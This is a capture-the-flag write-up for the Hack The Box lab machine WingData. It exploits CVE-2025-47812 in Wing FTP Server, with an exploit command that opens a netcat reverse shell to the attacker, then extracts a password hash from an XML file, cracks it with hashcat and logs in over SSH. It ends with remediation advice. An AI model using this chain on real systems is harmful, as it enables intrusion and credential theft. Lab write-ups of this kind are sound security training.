# WingData HTB Writeup

Author: Trushit Oza

## Target Information

- Machine: WingData
- Platform: Hack The Box
- Primary Hostname: wingdata.htb
- Target IP: 10.129.244.106
- Objective: Gain initial access, enumerate local data, and capture user flag

## 🧠 Thinking explanation

This assessment followed an attacker decision tree, where each observed signal was used to drive the next action:

1. Identify externally reachable services and extract trustworthy version/service metadata.
2. Validate application routing behavior to discover hidden subdomains and alternate attack surfaces.
3. Correlate discovered software version with known public vulnerabilities.
4. Move from theoretical vulnerability to practical exploitability by running a PoC safely in a controlled lab context.
5. Stabilize access, enumerate local secrets, and pivot to valid account access through credential recovery.
6. Confirm objective completion by authenticating through SSH and collecting the user flag.

This approach reduces noise and improves reproducibility because every command has a defined purpose in the chain.

## 📊 Tables

### Attack chain summary

| Stage | Key Action | Evidence | Outcome |
|---|---|---|---|
| Recon | Service scan with nmap | Open ports 22/80, Apache banner | Web and SSH attack surface identified |
| Enumeration | Follow redirects and inspect portal paths | wingdata.htb -> ftp.wingdata.htb | Wing FTP Server exposed |
| Vulnerability mapping | Match version to CVE | Wing FTP Server v7.4.3 + CVE-2025-47812 | Unauthenticated RCE path confirmed |
| Exploitation | Execute PoC + reverse shell | Listener callback + shell prompt | Initial foothold obtained |
| Credential access | Read local user XML | wacky.xml hash material found | Credential recovery path enabled |
| Privileged user access | Crack password and SSH login | hashcat output + SSH session | User flag retrieved |

### Command-to-purpose map

| Command | Purpose | Why it matters |
|---|---|---|
| nmap -sS -sV 10.129.244.106 | Service discovery and version detection | Establishes attackable services and likely exploit vectors |
| python3 CVE-2025-47812.py ... | Trigger remote code execution | Validates real-world impact of vulnerable service |
| cat /opt/wftpserver/Data/1/users/wacky.xml | Extract local credential artifacts | Supports lateral movement via valid credentials |
| hashcat -m 1410 ... | Recover plaintext password | Converts stored hash into operational access |
| ssh wacky@10.129.244.106 | Authenticate with recovered creds | Demonstrates compromise completion and persistence path |

## 1. Reconnaissance

### Update local host resolution

```bash
echo "10.129.244.106 wingdata.htb ftp.wingdata.htb" | sudo tee -a /etc/hosts
```

### Port and service scan

```bash
nmap -sS -sV 10.129.244.106
```

### Relevant findings

```text
22/tcp open  ssh   OpenSSH 9.2p1 Debian 2+deb12u7
80/tcp open  http  Apache httpd 2.4.66
```

- Web title: WingData Solutions
- Web server: Apache/2.4.66 (Debian)

![Nmap scan results](nmap-scan.png)

### 🔍 Analysis

Port 80 exposed the likely initial vector, while port 22 represented a potential post-exploitation pathway. The service fingerprints showed modern software but still did not eliminate the risk of application-level flaws, so the investigation intentionally prioritized web workflow mapping over brute-force service attacks.

## 2. Web Enumeration

### Initial web behavior

- Visiting http://10.129.244.106 redirects to http://wingdata.htb.
- The Client Portal path redirects to ftp.wingdata.htb.

### Service fingerprinting

- On ftp.wingdata.htb, the application version is exposed as Wing FTP Server v7.4.3.

![Web redirect flow](web.png)
![FTP subdomain page](ftp.web.png)

### 🔍 Analysis

The redirect chain revealed asset segmentation by subdomain. This is a common sign that distinct products are running behind the same entry point. Discovering ftp.wingdata.htb was critical because it shifted the attack from a generic web server to a specialized FTP management application with a known version string.

## 3. Vulnerability Identification

- Identified version: Wing FTP Server v7.4.3
- Public vulnerability: CVE-2025-47812
- Impact: Unauthenticated Remote Code Execution (RCE)

I searched for a publicly available proof of concept and used the following repository:

```bash
git clone https://github.com/4m3rr0r/CVE-2025-47812-poc.git
cd CVE-2025-47812-poc
```

![PoC repository and local setup](github-poc.png)

### 🔍 Analysis

Version-based vulnerability mapping is only useful when validated with context. Here, the exact exposed version enabled high-confidence matching to CVE-2025-47812. The PoC phase was not treated as blind execution; it was used as a controlled verification step to confirm exploitability and avoid false-positive reporting.

## 4. Exploitation

### Start listener

```bash
nc -lvnp 5555
```

### Execute exploit

```bash
python3 CVE-2025-47812.py -u http://ftp.wingdata.htb -c "nc 10.10.14.79 5555 -e /bin/sh" -v
```

### Confirm shell access

```bash
id
python3 -c "import pty; pty.spawn('/bin/bash')"
```

![Exploit execution](run-script.png)
![Listener confirmation](listner.png)
![Reverse shell access](shell.png)

### 🔍 Analysis

The successful callback demonstrated remote command execution impact beyond simple DoS or information leakage. Stabilizing the shell with a PTY improved command reliability and reduced operator error during subsequent local enumeration.

## 5. Post-Exploitation and Credential Discovery

### Locate user data

```bash
cd /opt/wftpserver/Data/1/users
ls
cat wacky.xml
```

The XML user file revealed credentials for local account wacky, including a stored hash:

```text
username: wacky
hash: 32940defd3c3ef70a2dd44a5301ff984c4742f0baae76ff5b8783994f8a503ca
```

![Credential artifact in wacky.xml](shell2.png)

### 🔍 Analysis

Credential artifacts in application data directories often represent the fastest path to authenticated access. Extracting the hash from wacky.xml allowed movement from transient shell access to durable account-level access, which is more valuable for objective completion and forensic replay.

## 6. Password Cracking

Prepared hash input and cracked with hashcat:

```bash
echo "32940defd3c3ef70a2dd44a5301ff984c4742f0baae76ff5b8783994f8a503ca:WingFTP" > password.txt
hashcat -m 1410 password.txt /usr/share/wordlists/rockyou.txt
```

Recovered password:

```text
!#7Blushing^*Bride5
```

<!-- ![Supporting screenshot for this phase](version.png) -->

### 🔍 Analysis

Offline cracking provided a low-noise method to convert captured credential material into plaintext credentials without generating authentication noise against the target service. This approach is operationally efficient and often bypasses account lockout controls.

## 7. SSH Access and User Flag

### SSH login

```bash
ssh wacky@10.129.244.106
```

### Retrieve user flag

```bash
cat ~/user.txt
```

![User flag retrieval](userflag.png)

### 🔍 Analysis

SSH access validated that the recovered credentials were not only theoretical but operationally valid for remote authentication. Retrieving user.txt completed the objective and provided definitive proof of compromise.

## 📊 Findings matrix

| Finding | Risk | Evidence source | Recommendation |
|---|---|---|---|
| Unauthenticated RCE in Wing FTP Server | Critical | Public CVE match + successful shell callback | Patch Wing FTP Server immediately and restrict exposure |
| Sensitive credential material stored in local XML | High | /opt/wftpserver/Data/1/users/wacky.xml | Encrypt/secure credential storage and least-privilege file ACLs |
| Service exposure to broad network surface | Medium | Publicly reachable portal endpoints | Limit access with network segmentation and IP allowlists |

## Remediation Notes

- Upgrade Wing FTP Server to a patched version that remediates CVE-2025-47812.
- Restrict management and portal exposure to trusted networks.
- Remove or harden command execution paths reachable from unauthenticated contexts.
- Enforce strong credential storage and avoid recoverable secrets in local XML files.
- Monitor for reverse shell patterns and suspicious outbound connections.

## Evidence Checklist

- [x] Recon and service discovery
- [x] Version disclosure and vulnerable service confirmation
- [x] Public PoC acquisition
- [x] Remote code execution
- [x] Local credential discovery
- [x] Password recovery
- [x] SSH access and user flag retrieval
